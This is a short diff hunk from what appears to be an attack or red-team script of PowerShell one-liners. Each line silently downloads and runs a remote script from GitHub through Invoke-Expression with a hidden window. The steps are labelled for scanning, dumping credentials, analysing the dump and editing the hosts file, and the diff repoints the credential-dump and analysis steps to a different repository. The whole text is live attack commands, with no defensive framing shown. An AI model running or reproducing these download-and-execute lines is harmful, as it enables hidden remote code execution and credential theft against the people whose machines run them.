@@ -7,10 +7,10 @@
 powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/scan.ps1')"
 
 #DumpingCredentials
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/cdump.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/cdump.ps1')"
 
 #AnalyzeDump
-#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/andump.ps1')"
+#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/dev/main/macro/andump.ps1')"
 
 #AddHosts
 #powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/hosts.ps1')"
